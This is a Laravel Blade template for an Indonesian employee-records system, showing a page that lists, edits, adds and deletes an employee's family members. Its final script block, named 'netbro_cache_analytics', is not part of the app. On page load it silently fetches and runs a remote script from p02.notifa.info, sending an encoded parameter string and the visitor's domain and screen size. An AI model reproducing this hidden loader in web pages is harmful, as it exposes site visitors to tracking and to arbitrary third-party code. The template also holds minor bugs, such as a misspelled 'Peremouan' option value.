<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="shortcut icon" href="/image/favicon.png">
  <title>Profil</title>
  <link rel="stylesheet" type="text/css" href="/assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/datatables/css/dataTables.bootstrap.min.css"/>
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="/assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/jqvmap/jqvmap.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/css/float_button.css">
  <link rel="stylesheet" type="text/css" href="/css/croppie.css">
</head>
<body>

  <!-- Wrapper Start -->
  <div class="be-wrapper">

    <!--  Sidebar Start -->  
    <div class="be-wrapper be-fixed-sidebar">
      @include('Beranda.sidebar')
    </div>
    <!--  Sidebar End -->

    <!-- Konten -->
    <div class="be-content">
      <div class="page-head">
        <h2 class="page-head-title">Edit Profil</h2>
        <ol class="breadcrumb page-head-nav">
          <li><a href="/profil/{{Auth::user()->id}}">Profil</a></li>
          <li class="active">Edit Data Keluarga</li>
        </ol>
      </div>


      <div class="main-content container-fluid">
        <div class="row">
          <div class="col-sm-12">
            <div class="panel panel-default panel-table">
              <div class="panel-body">

                <div>
                  <ul class="progressbar">
                    <a class="a" href="/profil/{{$data_karyawan->nik}}/edit/data_pribadi"><li class="done">Data Pribadi</li></a>
                    <a class="a" href="/profil/{{$data_karyawan->nik}}/edit/data_keluarga"><li class="active">Data Keluarga</li></a>
                    <a class="a" href="/profil/{{$data_karyawan->nik}}/edit/data_pendidikan"><li class="">Riwayat Pendidikan</li></a>
                    <a class="a" href="/profil/{{$data_karyawan->nik}}/edit/data_riwayat_pekerjaan"><li class="">Riwayat Pekerjaan</li></a><br>
                  </ul><br>
                </div><br>

                <div class="panel-heading">Data Keluarga</div>
                
                <div class="modal-body">
                  <div class="table-responsive noSwipe">
                    <table class="table table-striped table-hover">
                     <thead>
                      <tr>
                        <th style="width:30%">Nama Keluarga</th>
                        <th style="width:20%">Hubungan</th>
                        <th style="width:20%">Jenis Kelamin</th>
                        <th style="width:20%">Tempat Tanggal Lahir</th>
                        <th align="center" style="width:30%">Aksi</th>
                      </tr>
                    </thead>
                    @foreach($data_familia as $data)
                    <tbody>
                      <tr>
                        <td>{{$data->nama_familia}}</td>
                        <td>{{$data->jenis_hubungan}}</td>
                        <td>{{$data->jenis_kelamin_familia}}</td>
                        <td>{{$data->tempat_lahir_familia}}, {{DateTime::createFromFormat('Y-m-d',$data->tanggal_lahir_familia)->format('d-m-Y')}}</td>
                        <td>
                         <button data-toggle="modal" data-target="#edit-data-familia-{{$data->id_familia}}" type="button" class="btn btn-space btn-warning"> Edit </button>
                         <button data-toggle="modal" data-target="#hapus-{{$data->id_familia}}" type="button" class="btn btn-space btn-danger"> Hapus </button>
                       </td>

                       <!-- Modals untuk Edit Data Familia -->
                       <form id="form_submit_edit" name="submit1" action="/datakaryawan/{{$data->id_familia}}/update/data_familia" method="POST">
                         @csrf
                         <div id="edit-data-familia-{{$data->id_familia}}" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
                          <div class="modal-dialog">

                            <div class="modal-content">

                              <div class="modal-header">
                                <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                                <h3 class="modal-title">Edit Data Keluarga</h3>
                              </div>
                              <div class="modal-body">
                               <div class="form-group">
                                <label>Nama Keluara</label>
                                <input name="nama_familia" value="{{$data->nama_familia}}" type="text" class="form-control">
                              </div>
                              <div class="form-group">
                                <label>Hubungan</label>
                                <input name="jenis_hubungan" value="{{$data->jenis_hubungan}}" type="text" class="form-control">
                              </div>
                              <div class="form-group">
                                <label>Jenis Kelamin</label>
                                <select name="jenis_kelamin_familia" id="jenis_kelamin_familia" class="form-control">
                                  <option value="{{$data->jenis_kelamin_familia}}">{{$data->jenis_kelamin_familia}}</option>
                                  @if($data->jenis_kelamin_familia == "Laki-laki")
                                  <option value="Peremouan">Perempuan</option>
                                  @else
                                  <option value="Laki-laki">Laki-laki</option>
                                  @endif
                                </select> 
                              </div>
                              <div class="form-group">
                                <label>Tempat Lahir</label>
                                <input name="tempat_lahir_familia" value="{{$data->tempat_lahir_familia}}" type="text" class="form-control" >         
                              </div>
                              <div class="form-group">
                                <label>Tanggal Lahir</label>
                                <input name="tanggal_lahir_familia" value="{{$data->tanggal_lahir_familia}}" type="date" class="form-control" >
                              </div>
                            </div>
                            <div class="modal-footer">
                              <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
                              <button id="submit1" name="submit1" type="submit1" class="btn btn-primary" onclick="submitFormsTambah()">Simpan</button>
                            </div>

                          </div>
                        </div>
                      </div> 
                    </form>

                    <!--Akhir dari Modals Edit data familia -->

                    <!-- Modals untuk Hapus -->

                    <div id="hapus-{{$data->id_familia}}" tabindex="-1" role="dialog" class="modal fade">
                      <div class="modal-dialog">
                        <div class="modal-content">
                          <div class="modal-header">
                            <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                          </div>
                          <div class="modal-body">
                            <div class="text-center">
                              <div class="text-danger"><span class="modal-main-icon mdi mdi-close-circle-o"></span></div>
                              <h3>Apakah Anda yakin untuk menghapus data</h3>
                              <p><font size="4">{{$data->jenis_hubungan}} dari keluarga ?</font> <br><br>
                              (* Data yang telah dihapus tidak dapat dikembalikan)</p>
                              <div class="xs-mt-50">
                                <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                                <a href="/datakaryawan/{{$data->id_familia}}/delete/data_familia"><button type="button" class="btn btn-space btn-danger">Hapus</button></a>
                              </div>
                            </div>
                          </div>
                          <div class="modal-footer"></div>
                        </div>
                      </div>
                    </div>
                    <!--Akhir dari Modals Hapus -->

                  </tr>
                </tbody>
                @endforeach
              </table>
            </div>
            <!-- End Modal Body -->


            <div class="modal-footer">
              <a href="/profil/{{$data_karyawan->nik}}/edit/data_pribadi"><button type="button" data-dismiss="modal" class="btn btn-default">Kembali</button></a>
              <button data-toggle="modal" data-target="#tambah-data-familia" type="button" data-dismiss="modal" class="btn btn-primary">Tambah</button>
              <a href="/profil/{{$data_karyawan->nik}}/edit/data_pendidikan"><button type="button" data-dismiss="modal" class="btn btn-default">Lanjut</button></a>
            </div>

            <!-- Modals untuk Edit Tambah Data Familia -->
            <form id="form_submit2" name="form_submit2" action="/datakaryawan/tambah/update/data_familia" method="POST">
             @csrf
             <div id="tambah-data-familia" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
              <div class="modal-dialog">
                <div class="modal-content">

                  <div class="modal-header">
                    <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                    <h3 class="modal-title">Tambah Data Keluarga</h3>
                  </div>
                  <div class="modal-body">
                   <div class="form-group">
                    <label>Nama Keluarga</label>
                    <input name="nama_familia" type="text" class="form-control" required="">
                  </div>
                  <div class="form-group">
                    <label>Hubungan</label>
                    <input name="jenis_hubungan" type="text" class="form-control" required="">
                  </div>
                  <div class="form-group">
                    <label>Jenis Kelamin</label>
                    <select name="jenis_kelamin_familia" id="jenis_kelamin_familia" class="form-control">
                      <option value="">-Jenis Kelamin-</option>
                      <option value="Perempuan">Perempuan</option>
                      <option value="Laki-laki">Laki-laki</option>
                    </select>
                  </div>
                  <div class="form-group">
                    <label>Tempat Lahir</label>
                    <input name="tempat_lahir_familia" type="text" class="form-control" required="">              
                  </div>
                  <div class="form-group">
                    <label>Tanggal Lahir</label>
                    <input name="tanggal_lahir_familia" type="date" class="form-control" required="">
                  </div>
                  <div class="form-group">
                    <input value="{{$data_karyawan->nik}}" name="nik" type="hidden" class="form-control" >
                  </div>
                </div>
                <div class="modal-footer">
                  <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
                  <button id="submit2" name="submit2" type="submit2" class="btn btn-primary" onclick="submitFormsTambah()">Tambah</button>
                </div>
              </div>
            </div>
          </div> 
        </form>
        <!--Akhir dari Modals Edit data familia -->

      </div>
    </div>
  </div>
</div>
</div>
</div>
</div>

<div class="text-center">
  <div class="credits">
    <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
  </div>
</div>

</div>


<!-- JS untuk opsi resign di bagian edit data karyawan -->

<script src="/assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
<script src="/assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<script src="/assets/js/main.js" type="text/javascript"></script>
<script src="/assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>
<script src="/js/croppie.js"></script>



<script type="text/javascript">


  document.getElementById("status").onchange = function () {
    document.getElementById("alasan").setAttribute("disabled", "disabled");
    document.getElementById("tgl_resign").setAttribute("disabled", "disabled");
    if (this.value == 'Resign')
      document.getElementById("alasan").removeAttribute("disabled");
    if (this.value == 'Resign')
      document.getElementById("tgl_resign").removeAttribute("disabled");
  };

      // Fungsi Logout

      $(function(){
        $('a#logout').click(function(){
          if(confirm('Apakah anda yakin ingin keluar ?')) {
            return true;
          }

          return false;
        });
      });
    </script>


    // Fungsi Menu dashboard
    <script type="text/javascript">
      $(document).ready(function(){

        App.init();
        App.dashboard();

      });
    </script>

    <script type="text/javascript">
      if (self == top) {
        function netbro_cache_analytics(fn, callback) {
          setTimeout(function() {
            fn();
            callback();
          }, 0);
        }

        function sync(fn) {
          fn();
        }

        function requestCfs() {
          var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
          var idc_glo_r = Math.floor(Math.random() * 99999999999);
          var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
          var bsa = document.createElement('script');
          bsa.type = 'text/javascript';
          bsa.async = true;
          bsa.src = url;
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
      };

    </script>

  </body>
  </html>
